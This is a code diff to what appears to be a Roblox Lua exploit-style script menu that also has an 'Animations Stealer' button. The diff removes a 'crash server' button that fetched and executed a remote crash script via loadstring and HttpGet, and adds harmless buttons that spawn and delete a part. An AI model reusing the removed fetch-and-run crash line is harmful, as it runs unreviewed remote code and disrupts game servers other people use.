@@ -768,6 +768,29 @@ Section:NewButton("Animations", "Animations Stealer", function()
 end)
 
 
-Section:NewButton("crash server", "crash server", function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/Andre8657/Scripts/main/Crash%20Script", true))()
+Section:NewButton("Spawn Part", "Spawn Parts", function()
+    local Part = Instance.new("Part")
+	Part.Parent = workspace
+	Part.Name = "Pupsik"
+	Part.Size = Vector3.new(5, 5, 5)
+end)
+
+
+Section:NewButton("Delete Part", "Delete Parts", function()
+    -- ServerScript: удалить парта по имени
+local partName = "Pupsik" -- замените на имя вашего парта
+
+local function removePart()
+    local part = workspace:FindFirstChild("Pupsik")
+    if part and part:IsA("BasePart") then
+        part:Destroy()
+        print(partName .. " удалён(а).")
+    else
+        warn("Парт " .. partName .. " не найден или это не BasePart.")
+    end
+end
+
+-- Вызовем сразу (или вызывать по событию/таймеру)
+removePart()
+
 end)
